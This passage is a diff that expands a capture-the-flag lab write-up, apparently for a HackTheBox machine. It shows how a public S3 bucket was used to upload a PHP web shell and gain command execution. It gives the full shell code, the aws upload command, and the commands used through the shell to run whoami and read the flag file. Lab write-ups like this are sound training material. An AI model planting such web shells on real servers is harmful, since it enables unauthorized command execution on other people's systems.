@@ -188,21 +188,66 @@ images/
 This confirms that the S3 bucket backs the web application, PHP is running the website and 'images' is hosting the images displayed on the website. 
 
 ## Exploitation: Remote Code Execution via File Upload
+So far, we know:
+- The S3 bucket is **public**
+- You can **list** and **upload files**
+- The bucket is the **actual backend** of the website
+- If you upload a PHP file **it executes on the server**
+- This might gives us **RCE** → remote command execution → **flag**
 
-We uploaded a simple PHP web shell:
+**1.- We created a file called shell.php:**
+<pre>nano shell.php</pre>
 
-aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
+We write the following content:
+<pre><?php
+if(isset($_GET['cmd'])){
+system($_GET['cmd']);
+}
+?></pre>
+![Shell](img/shell.jpg)
+
+This allows us to execute commands by passing ?cmd=COMMAND in the URL.
+
+**2.- Upload the webshell to the S3 bucket**
+
+<pre>aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
+
+upload: ./shell.php to s3://thetoppers.htb/shell.php</pre>
+
+![Shell Uploades](img/shell-upload.jpg)
+
+**3.-Accessing it via browser allowed command execution:**
 
 
-Accessing it via browser allowed command execution:
-
-http://thetoppers.htb/shell.php?cmd=whoami
+<pre>http://thetoppers.htb/shell.php?cmd=whoami</pre>
 
 
 Result:
 
-www-data
+<pre>www-data</pre>
 
+![Shell access](img/dentro-shell.jpg)
 
 This confirms successful RCE.
+
+## Post-Exploitation & Flag
+
+Listing the parent directory:
+
+http://thetoppers.htb/shell.php?cmd=ls%20..
+
+
+Revealed:
+
+flag.txt
+html
+
+
+Reading the flag:
+
+http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt
+
+
+✅ Flag successfully retrieved
+
 
